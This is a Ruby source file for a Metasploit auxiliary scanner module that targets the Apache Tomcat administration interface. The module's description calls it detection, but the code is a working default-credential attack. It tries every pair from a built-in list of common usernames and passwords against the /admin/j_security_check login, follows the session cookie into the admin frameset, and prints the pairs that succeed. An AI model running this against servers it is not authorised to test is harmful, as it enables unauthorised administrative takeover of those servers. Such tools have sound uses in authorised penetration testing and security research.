##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::WmapScanServer
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Tomcat Administration Tool Default Access',
      'Description' => 'Detect the Tomcat administration interface.',
      'References'  =>
        [
          ['URL', 'http://tomcat.apache.org/'],
        ],
      'Author'      => 'Matteo Cantoni <goony[at]nothink.org>',
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(8180),
        OptString.new('TOMCAT_USER', [ false, 'The username to authenticate as', '']),
        OptString.new('TOMCAT_PASS', [ false, 'The password for the specified username', '']),
      ], self.class)
  end

  def run_host(ip)

    begin
      res = send_request_raw(
        {
          'method'  => 'GET',
          'uri'     => '/',
        }, 25)

      http_fingerprint({ :response => res })

      if (res and res.code == 200)

        ver = ""

        if res.body.match(/<title>Apache Tomcat\/(.*)<\/title>/)
          ver = "Apache Tomcat/" + $1
        end

        user = datastore['TOMCAT_USER'].to_s
        pass = datastore['TOMCAT_PASS'].to_s

        if user.length == 0
          default_usernames = ['admin','manager','role1','root','tomcat']
        else
          default_usernames = [user]
        end

        if pass.length == 0
          default_passwords = ['admin','manager','role1','root','tomcat']
        else
          default_passwords = [pass]
        end

        default_usernames.each do |username|
          default_passwords.each do |password|

            res = send_request_raw({
              'method'  => 'GET',
              'uri'     => '/admin/',
            }, 25)

            if (res and res.code == 200)

              if (res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/JSESSIONID=(.*);(.*)/i))

                jsessionid = $1

                post_data = "j_username=#{username}&j_password=#{password}"

                res = send_request_cgi({
                  'uri'          => '/admin/j_security_check',
                  'method'       => 'POST',
                  'content-type' => 'application/x-www-form-urlencoded',
                  'cookie'       => "JSESSIONID=#{jsessionid}",
                  'data'         => post_data,
                }, 25)

                if (res and res.code == 302)

                  res = send_request_cgi({
                    'uri'     => "/admin/",
                    'method'  => 'GET',
                    'cookie'  => "JSESSIONID=#{jsessionid}",
                  }, 25)

                  if (res and res.code == 302)

                    res = send_request_cgi({
                      'uri'     => "/admin/frameset.jsp",
                      'method'  => 'GET',
                      'cookie'  => "JSESSIONID=#{jsessionid}",
                    }, 25)

                    if (res and res.code == 200)
                      print_status("http://#{target_host}:#{rport}/admin [#{res.headers['Server']}] [#{ver}] [Tomcat Server Administration] [#{username}/#{password}]")
                    end

                    # LogOut
                    res = send_request_cgi({
                      'uri'          => '/admin/logOut.do',
                      'method'       => 'GET',
                      'cookie'       => "JSESSIONID=#{jsessionid}",
                    }, 25)
                  end
                end
              end
            end
          end
        end
      end

      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
